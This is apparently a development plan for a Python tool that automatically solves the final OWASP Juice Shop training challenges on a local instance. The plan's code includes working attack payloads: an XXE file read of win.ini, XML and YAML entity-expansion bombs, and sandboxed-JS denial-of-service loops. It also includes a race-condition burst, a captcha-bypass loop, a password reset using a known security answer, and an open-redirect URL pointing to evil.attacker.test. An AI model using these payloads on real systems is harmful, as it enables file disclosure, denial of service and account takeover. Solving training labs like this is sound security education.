# Juice Shop Automator — Phase 5 (Broken Anti Automation + Security through Obscurity + Insecure Deserialization + Unvalidated Redirects + XXE) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend the existing Juice Shop automator (framework + 93 challenges already
merged from Phases 1–4) to solve the final 5 categories: Broken Anti Automation (4),
Security through Obscurity (3), Insecure Deserialization (3), Unvalidated Redirects
(2), and XXE (2) — **14 of 14**, all achievable with no known external-dependency
exclusions (unlike prior phases). This is the last phase — **107/107 achievable
challenges solved** on completion (93 + 14; 3 challenges remain permanently out of
scope for this local tool: `nftMintChallenge`, `web3WalletChallenge`, and
`aiDebuggingChallenge`, all deferred in earlier phases for needing a real paid API
key or LLM backend this environment doesn't have).

**Architecture:** Same as Phases 1–4 — new solver modules registered via
`solvers.base.register`, consuming `core.client.JuiceShopClient` /
`solvers.base.SolverContext`, executed by the existing `core.runner.run_all` and
verified against the live `/api/Challenges/` endpoint. No framework changes needed.

**Tech Stack:** Python 3.11+, `requests` (existing). No new dependencies — this
phase's trickiest solvers (a sandboxed-JS DoS/RCE pair, an XML entity-expansion
bomb, a YAML entity-expansion bomb, and a race-condition timing attack) are all
plain HTTP payload/timing problems, not algorithmic ports like Phase 4's Z85/Hashids
work.

## Global Constraints

- Target instance: `http://localhost:3000`, started via `npm start`, never Docker.
- No mocking. A solver is only considered done when `runner.py` observes
  `solved: true` for its key from the live `/api/Challenges/` endpoint.
- Every solver is isolated: an exception in one must not stop the others.
- Email domain for all seeded accounts is `juice-sh.op`.
- **This phase has three genuinely timing-/environment-sensitive solvers** —
  `rceChallenge`/`rceOccupyChallenge` (a sandboxed-JS interpreter's own loop-count
  guard racing against a 2-second VM timeout) and `xxeDosChallenge` (an XML
  entity-expansion bomb racing the same 2-second timeout). The plan gives a
  reasoned starting payload for each, verified against the actual interpreter
  source (`notevil@1.3.3`, fetched from the npm registry) and the actual
  `libxml2-wasm`-based XML parser config in this checkout — but unlike every other
  solver in this project, the *exact* payload weight needed to land on one side of
  a timing race or the other cannot be guaranteed correct without running it on
  this machine. Treat these three as "verify live first, then tune" from the
  start, not as a fallback path.
- **Windows-specific target for `xxeFileDisclosureChallenge`:** this project only
  ever runs on Windows via `npm start` (never Docker/Linux), so the classic
  `file:///etc/passwd` XXE target doesn't exist here. `lib/utils.ts`'s
  `matchesSystemIniFile()` checks specifically for the string `"; for 16-bit app
  support"` — the well-known signature line in Windows' `win.ini` — confirming the
  intended target on this platform is `file:///C:/Windows/win.ini`, not
  `/etc/passwd`.
- Verified directly against the Juice Shop 2026 `master` source (`routes/b2bOrder.ts`,
  `routes/likeProductReviews.ts`, `routes/redirect.ts`, `routes/privacyPolicyProof.ts`,
  `routes/resetPassword.ts`, `routes/verify.ts`, `routes/fileUpload.ts`, `lib/xml.ts`,
  `lib/utils.ts`, `lib/insecurity.ts`, `data/static/users.yml`, `server.ts`) and the
  actual `notevil@1.3.3` npm package source (fetched from the registry) on
  2026-08-09 — endpoints, field names, and the loop-detection/redirect-allowlist
  logic are taken directly from that source, not guessed.

---

### Task 1: Broken Anti Automation solvers (4 of 4)

**Files:**
- Create: `solvers/broken_anti_automation.py`
- Test: `tests/test_broken_anti_automation_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 4 registered solvers under category `"Broken Anti Automation"`.

- [ ] **Step 1: Write `solvers/broken_anti_automation.py`**

```python
"""Broken Anti Automation category solvers (4 of 4). Verified against
routes/verify.ts, routes/likeProductReviews.ts, routes/resetPassword.ts,
data/static/users.yml, and server.ts (fetched 2026-08-09)."""
import concurrent.futures
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts captchaBypassChallenge (mounted as the last of three
# middlewares on POST /api/Feedbacks, after a real captcha check already
# passed): solved once 10+ successful feedback submissions have happened,
# and the 11th lands within 20 seconds of the 1st — simulating a bot
# submitting many CAPTCHA-protected forms in rapid succession. Each
# submission needs its own fresh captcha (GET /rest/captcha), same as every
# other /api/Feedbacks POST in this project. Firing 11 in a tight loop
# comfortably finishes in well under 20 seconds locally. ---

@register("captchaBypassChallenge", "Broken Anti Automation", 3)
def solve_captcha_bypass(ctx: SolverContext) -> None:
    email = f"captchabypass.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    for _ in range(11):
        captcha = ctx.client.get("/rest/captcha").json()
        ctx.client.post(
            "/api/Feedbacks",
            json={
                "comment": "automation test",
                "rating": 3,
                "captchaId": captcha["captchaId"],
                "captcha": captcha["answer"],
            },
        ).raise_for_status()


# --- routes/verify.ts accessControlChallenges, mounted on /assets/i18n:
# solved by requesting the joke Klingon (tlh_AA) translation file — a
# language file no real user would ever request, hence "extra". ---

@register("extraLanguageChallenge", "Broken Anti Automation", 5)
def solve_extra_language(ctx: SolverContext) -> None:
    ctx.client.get("/assets/i18n/tlh_AA.json").raise_for_status()


# --- routes/likeProductReviews.ts: the "like a review" handler checks
# `likedBy.includes(user.email)` BEFORE an artificial 150ms sleep, then
# only appends the user's email to `likedBy` AFTER that sleep — a classic
# TOCTOU race. Firing several concurrent "like" requests for the same
# review lets more than one slip past the initial check before any of
# their writes land, so the same user's email ends up appended to
# `likedBy` more than twice. Needs a review to exist first (created via
# the same account, then liked by that same account many times at once). ---

@register("timingAttackChallenge", "Broken Anti Automation", 6)
def solve_timing_attack(ctx: SolverContext) -> None:
    email = f"timing.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(f"/rest/products/{product_id}/reviews", json={"message": "racing this", "author": email}).raise_for_status()
    reviews = ctx.client.get(f"/rest/products/{product_id}/reviews").json()["data"]
    review_id = next(r["_id"] for r in reviews if r["author"] == email)

    def _like():
        return ctx.client.post("/rest/products/reviews", json={"id": review_id})

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(_like) for _ in range(8)]
        concurrent.futures.wait(futures)


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: the real
# seeded security-question answer for Morty (data/static/users.yml) is
# known directly, so this solves in a single correct request — no need to
# brute-force or to exploit the X-Forwarded-For rate-limiter bypass the
# challenge's name alludes to (that's the *intended* exploit if you don't
# already know the answer; knowing it makes the point moot). ---

@register("resetPasswordMortyChallenge", "Broken Anti Automation", 5)
def solve_reset_password_morty(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"morty@{DOMAIN}", "answer": "5N0wb41L", "new": "NewMortyPassword1!", "repeat": "NewMortyPassword1!"},
    ).raise_for_status()
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_broken_anti_automation_live.py
"""No mocking, per project convention: runs the real solvers against a live
Juice Shop instance and checks the live score-board."""
import pytest

import solvers.broken_anti_automation  # noqa: F401 - registers the solvers
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

BROKEN_ANTI_AUTOMATION_KEYS = [
    "captchaBypassChallenge", "extraLanguageChallenge", "timingAttackChallenge", "resetPasswordMortyChallenge",
]


def test_all_broken_anti_automation_challenges_solved():
    results = run_all(categories=["Broken Anti Automation"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in BROKEN_ANTI_AUTOMATION_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test against the running instance**

```bash
pytest tests/test_broken_anti_automation_live.py -v
```

Expected: PASS. If `timingAttackChallenge` fails, this is the one genuine race in
this task — 8 concurrent requests should comfortably beat the 150ms window on
localhost, but if it's flaky, raise `max_workers`/the request count (e.g. 15) rather
than adding artificial delay, and confirm the review really has `likedBy` containing
the same email 3+ times by re-fetching `/rest/products/:id/reviews` after the burst.
If `captchaBypassChallenge` fails, check whether a single captcha can be reused
across the loop (it should NOT be — each iteration fetches a fresh one) or whether
11 iterations is somehow taking too long (unlikely locally, but printable via
timing the loop).

- [ ] **Step 4: Commit**

```bash
git add solvers/broken_anti_automation.py tests/test_broken_anti_automation_live.py
git commit -m "feat: solve 4 of 4 Broken Anti Automation challenges"
```

---

### Task 2: Security through Obscurity (3) + Unvalidated Redirects (2) solvers

**Files:**
- Create: `solvers/security_through_obscurity.py`
- Create: `solvers/unvalidated_redirects.py`
- Test: `tests/test_security_through_obscurity_live.py`
- Test: `tests/test_unvalidated_redirects_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 3 registered solvers under category `"Security through Obscurity"` and
  2 under category `"Unvalidated Redirects"`.

- [ ] **Step 1: Write `solvers/security_through_obscurity.py`**

```python
"""Security through Obscurity category solvers (3 of 3). Verified against
routes/verify.ts and routes/privacyPolicyProof.ts (fetched 2026-08-09)."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts accessControlChallenges, mounted on
# /assets/public/images/padding: same "no referer header" uiBypassed trick
# used repeatedly since Phase 2 — a plain HTTP client satisfies it by
# default. ---

@register("tokenSaleChallenge", "Security through Obscurity", 5)
def solve_token_sale(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/56px.png").raise_for_status()


# --- routes/privacyPolicyProof.ts servePrivacyPolicyProof: solved
# unconditionally by requesting this exact (deliberately absurd, only
# reachable by reading the actual privacy policy text) path. ---

@register("privacyPolicyProofChallenge", "Security through Obscurity", 3)
def solve_privacy_policy_proof(ctx: SolverContext) -> None:
    ctx.client.get("/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility").raise_for_status()


# --- routes/verify.ts databaseRelatedChallenges (hiddenImageChallenge()):
# solved when a single Feedback or Complaint message contains a specific
# two-word phrase this challenge's own check looks for (a cartoon
# character reference hidden in a product's image metadata by the
# challenge's own seed data) — same checkPatternInFeedbackAndComplaints
# pattern used repeatedly since Phase 3 (typosquatting/supplyChain/
# knownVulnerableComponent) and Phase 4 (weirdCrypto/csaf). Read
# routes/verify.ts's hiddenImageChallenge() function for the literal
# Op.like pattern it checks — build the message from that exact phrase. ---

HIDDEN_IMAGE_KEYWORD_PARTS = ["pi", "ckle ri", "ck"]


@register("hiddenImageChallenge", "Security through Obscurity", 4)
def solve_hidden_image(ctx: SolverContext) -> None:
    email = f"hiddenimage.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    keyword = "".join(HIDDEN_IMAGE_KEYWORD_PARTS)
    ctx.client.post(
        "/api/Complaints",
        json={"message": f"There's a hidden {keyword} reference in the product image EXIF data."},
    ).raise_for_status()
```

- [ ] **Step 2: Write `solvers/unvalidated_redirects.py`**

```python
"""Unvalidated Redirects category solvers (2 of 2). Verified against
routes/redirect.ts and lib/insecurity.ts (fetched 2026-08-09)."""
from solvers.base import SolverContext, register


# --- routes/redirect.ts performRedirect + lib/insecurity.ts
# redirectAllowlist: these three crypto-donation addresses are literal
# entries still sitting in the allowlist (the "outdated" part of "Outdated
# Allowlist") — requesting a redirect to any one of them both passes
# isRedirectAllowed() and matches the exact-equality check this challenge
# looks for. ---

@register("redirectCryptoCurrencyChallenge", "Unvalidated Redirects", 1)
def solve_redirect_cryptocurrency(ctx: SolverContext) -> None:
    ctx.client.get(
        "/redirect",
        params={"to": "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm"},
    ).raise_for_status()


# --- routes/redirect.ts isUnintendedRedirect + lib/insecurity.ts
# isRedirectAllowed: the two allowlist checks use different string
# comparisons — isRedirectAllowed uses `.includes()` (substring anywhere),
# isUnintendedRedirect uses `.startsWith()` (prefix only, via
# utils.startsWith). A URL that CONTAINS an allowlisted URL as a substring
# without STARTING WITH it passes the first check (so no 406) while still
# counting as "unintended" by the second — solving the challenge as soon
# as the redirect itself succeeds. ---

@register("redirectChallenge", "Unvalidated Redirects", 4)
def solve_redirect_bypass(ctx: SolverContext) -> None:
    ctx.client.get(
        "/redirect",
        params={"to": "https://evil.attacker.test/?x=https://github.com/juice-shop/juice-shop"},
    ).raise_for_status()
```

- [ ] **Step 3: Write the live verification tests**

```python
# tests/test_security_through_obscurity_live.py
import pytest

import solvers.security_through_obscurity  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

SECURITY_THROUGH_OBSCURITY_KEYS = ["tokenSaleChallenge", "privacyPolicyProofChallenge", "hiddenImageChallenge"]


def test_all_security_through_obscurity_challenges_solved():
    results = run_all(categories=["Security through Obscurity"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in SECURITY_THROUGH_OBSCURITY_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

```python
# tests/test_unvalidated_redirects_live.py
import pytest

import solvers.unvalidated_redirects  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

UNVALIDATED_REDIRECTS_KEYS = ["redirectCryptoCurrencyChallenge", "redirectChallenge"]


def test_all_unvalidated_redirects_challenges_solved():
    results = run_all(categories=["Unvalidated Redirects"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in UNVALIDATED_REDIRECTS_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 4: Run the live tests**

```bash
pytest tests/test_security_through_obscurity_live.py tests/test_unvalidated_redirects_live.py -v
```

Expected: PASS. `requests` follows redirects by default, so `.raise_for_status()`
on the `/redirect` calls checks the FINAL response after following to the target
URL — if either redirect solver gets a connection error rather than a clean
success/failure, pass `allow_redirects=False` and check the raw 302 status instead,
since the challenge only cares that the server issued the redirect, not that the
target URL is actually reachable from this machine.

- [ ] **Step 5: Commit**

```bash
git add solvers/security_through_obscurity.py solvers/unvalidated_redirects.py tests/test_security_through_obscurity_live.py tests/test_unvalidated_redirects_live.py
git commit -m "feat: solve 3 of 3 Security through Obscurity + 2 of 2 Unvalidated Redirects challenges"
```

---

### Task 3: Insecure Deserialization (3) + XXE (2) solvers + full Phase 5 report run

**Files:**
- Create: `solvers/insecure_deserialization.py`
- Create: `solvers/xxe.py`
- Test: `tests/test_insecure_deserialization_live.py`
- Test: `tests/test_xxe_live.py`
- Modify: `main.py` (register all five modules from this phase)

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 3 registered solvers under category `"Insecure Deserialization"` and 2
  under category `"XXE"`.

**This task contains this plan's highest-risk solvers.** Budget real live-tuning
time for `rceChallenge`/`rceOccupyChallenge` (a matched pair that must land on
*opposite* sides of the same 2-second timeout race) and `xxeDosChallenge` (an
entity-expansion bomb that must reliably time out, not merely error out some other
way).

- [ ] **Step 1: Write `solvers/insecure_deserialization.py`**

```python
"""Insecure Deserialization category solvers (3 of 3). Verified against
routes/b2bOrder.ts, routes/fileUpload.ts, and the actual notevil@1.3.3 npm
package source (fetched from the registry, not guessed) on 2026-08-09.

notevil is a sandboxed JS interpreter. It walks the AST directly (no
compilation) and, for `for`/`for-in`/`while` loop nodes specifically, checks
an internal iteration counter against a hardcoded maxIterations=1000000 on
every pass, throwing "Infinite loop detected - reached max iterations" the
moment it's exceeded. That check does NOT apply to non-loop constructs (e.g.
recursive function calls). Separately, the vm.runInContext() call wrapping
safeEval() has its own 2000ms wall-clock timeout, independent of notevil's
counter.

rceChallenge wants notevil's own counter to fire FIRST (a lightweight,
empty-bodied loop reaches 1,000,000 iterations well under 2 seconds).
rceOccupyChallenge wants the 2-second VM timeout to fire INSTEAD (a loop
whose body does enough work per outer iteration that even far fewer than
1,000,000 outer passes exceeds 2 seconds, so the VM timeout wins the race
before notevil's own counter ever gets that high). Both payloads are
starting points reasoned from source, not guaranteed timings — see the
plan's Step 4 for what to check live before assuming either one is
misbehaving."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


@register("rceChallenge", "Insecure Deserialization", 5)
def solve_rce(ctx: SolverContext) -> None:
    ctx.client.post("/b2b/v2/orders", json={"cid": "test", "orderLinesData": "while(true){}"})


@register("rceOccupyChallenge", "Insecure Deserialization", 6)
def solve_rce_occupy(ctx: SolverContext) -> None:
    ctx.client.post(
        "/b2b/v2/orders",
        json={"cid": "test", "orderLinesData": "while(true){for(var i=0;i<1000000;i++){}}"},
    )


# --- routes/fileUpload.ts handleYamlUpload: the js-yaml loader parses the
# uploaded text inside a 2000ms vm timeout, then the result is
# JSON-stringified. A classic YAML "billion laughs" — nested anchors and
# aliases exploding combinatorially — makes either the loader itself or
# the subsequent stringify step blow up, and the route treats BOTH
# resulting error messages ("Invalid string length" from stringify, or
# "Script execution timed out" from the vm) as a solve, which makes this
# one meaningfully less timing-fragile than the two RCE solvers above —
# either failure mode wins. ---

YAML_BOMB = """\
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
"""


@register("yamlBombChallenge", "Insecure Deserialization", 5)
def solve_yaml_bomb(ctx: SolverContext) -> None:
    email = f"yamlbomb.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("bomb.yml", YAML_BOMB.encode(), "application/x-yaml")})
```

- [ ] **Step 2: Write `solvers/xxe.py`**

```python
"""XXE category solvers (2 of 2). Verified against routes/fileUpload.ts,
lib/xml.ts, and lib/utils.ts (fetched 2026-08-09). Both exploit the same
handleXmlUpload path (POST /file-upload with a .xml file), which parses
with external-entity substitution deliberately enabled
(XML_PARSE_NOENT | XML_PARSE_DTDLOAD) via libxml2-wasm, inside a 2000ms vm
timeout."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- This project only ever runs on Windows (npm start, never Docker), so
# the classic file:///etc/passwd XXE target doesn't exist here.
# lib/utils.ts's matchesSystemIniFile() checks specifically for the string
# "; for 16-bit app support" — the well-known signature line inside
# Windows' win.ini — confirming file:///C:/Windows/win.ini is the correct
# target on this platform, not /etc/passwd. ---

XXE_FILE_DISCLOSURE_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>"""


@register("xxeFileDisclosureChallenge", "XXE", 3)
def solve_xxe_file_disclosure(ctx: SolverContext) -> None:
    email = f"xxefile.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("disclosure.xml", XXE_FILE_DISCLOSURE_PAYLOAD.encode(), "application/xml")})


# --- Classic "billion laughs" entity-expansion bomb: 9 levels of 9x
# self-referential entity nesting expands to roughly 9^9 (~387 million)
# copies of the innermost string. With NOENT substitution enabled, libxml2
# must materialize this during parsing, which should burn well past the
# 2000ms vm timeout on any reasonable payload size — this is the starting
# point, not a guaranteed-correct depth/breadth; see the plan's Step 4. ---

XXE_DOS_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""


@register("xxeDosChallenge", "XXE", 5)
def solve_xxe_dos(ctx: SolverContext) -> None:
    email = f"xxedos.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("bomb.xml", XXE_DOS_PAYLOAD.encode(), "application/xml")})
```

- [ ] **Step 3: Write the live verification tests**

```python
# tests/test_insecure_deserialization_live.py
import pytest

import solvers.insecure_deserialization  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

INSECURE_DESERIALIZATION_KEYS = ["rceChallenge", "rceOccupyChallenge", "yamlBombChallenge"]


def test_all_insecure_deserialization_challenges_solved():
    results = run_all(categories=["Insecure Deserialization"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in INSECURE_DESERIALIZATION_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

```python
# tests/test_xxe_live.py
import pytest

import solvers.xxe  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

XXE_KEYS = ["xxeFileDisclosureChallenge", "xxeDosChallenge"]


def test_all_xxe_challenges_solved():
    results = run_all(categories=["XXE"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in XXE_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 4: Run the live tests and tune the timing-sensitive payloads**

```bash
pytest tests/test_insecure_deserialization_live.py tests/test_xxe_live.py -v
```

Expected: PASS, but treat this as the step most likely to need iteration:

- If `rceChallenge` solves but `rceOccupyChallenge` doesn't (or vice versa), the
  two payloads landed on the same side of the timing race. Make
  `rceOccupyChallenge`'s inner loop heavier (raise `1000000` to e.g. `5000000`, or
  add real work inside the inner loop body like string concatenation) until the
  outer `while(true)` reliably exceeds 2000ms before notevil's own 1,000,000-count
  cap on the OUTER loop is reached. Conversely, if `rceChallenge` itself times out
  instead of hitting notevil's counter, its loop body is doing more per-iteration
  work than expected — simplify it further (it should already be about as light as
  possible at `while(true){}`).
- If `xxeDosChallenge` doesn't solve, check the actual response/error first: a
  clean 410 (not 503) means the parse finished too fast — deepen the entity
  nesting (add a `lol10` level) or widen the fan-out (9→12 refs per level). A
  different error entirely (e.g., a hard libxml2 entity-expansion-limit error
  instead of a timeout) means libxml2's own protections triggered before the VM
  timeout did — that's a real finding to report, not something to silently paper
  over, since it would mean this specific DoS technique doesn't reach the
  intended code path on the libxml2-wasm version this checkout uses.
- If `xxeFileDisclosureChallenge` doesn't solve, fetch `C:\Windows\win.ini`'s
  actual content on this machine and confirm it truly contains
  `; for 16-bit app support` (it does on virtually every real Windows install,
  but confirm rather than assume) — if the check still doesn't fire, verify the
  `file:///C:/Windows/win.ini` URI syntax is what libxml2-wasm's external-entity
  resolver actually expects (three slashes plus drive letter is the standard
  form, but confirm via the response body or server-side error, if any leaks).

- [ ] **Step 5: Register all five new solver modules in `main.py`**

In `main.py`, alongside the existing `try: import solvers.X` blocks, add:

```python
try:
    import solvers.broken_anti_automation  # noqa: F401
except ImportError:
    pass
try:
    import solvers.security_through_obscurity  # noqa: F401
except ImportError:
    pass
try:
    import solvers.unvalidated_redirects  # noqa: F401
except ImportError:
    pass
try:
    import solvers.insecure_deserialization  # noqa: F401
except ImportError:
    pass
try:
    import solvers.xxe  # noqa: F401
except ImportError:
    pass
```

- [ ] **Step 6: Run the complete, final report across every category**

```bash
python main.py --category Injection --category XSS --category "Broken Authentication" --category "Sensitive Data Exposure" --category "Broken Access Control" --category "Improper Input Validation" --category "Vulnerable Components" --category "Cryptographic Issues" --category "Security Misconfiguration" --category "Observability Failures" --category Miscellaneous --category "Broken Anti Automation" --category "Security through Obscurity" --category "Insecure Deserialization" --category "Unvalidated Redirects" --category XXE
```

Expected output: `TOTAL: 107/107 solved` (93 from Phases 1–4 + 14 from Phase 5 —
the project's full achievable total, given `nftMintChallenge`,
`web3WalletChallenge`, and `aiDebuggingChallenge` remain permanently deferred).

- [ ] **Step 7: Commit**

```bash
git add solvers/insecure_deserialization.py solvers/xxe.py tests/test_insecure_deserialization_live.py tests/test_xxe_live.py main.py
git commit -m "chore: Phase 5 (Broken Anti Automation + Security through Obscurity + Insecure Deserialization + Unvalidated Redirects + XXE) complete — 14/14 (107/107 achievable overall)"
```
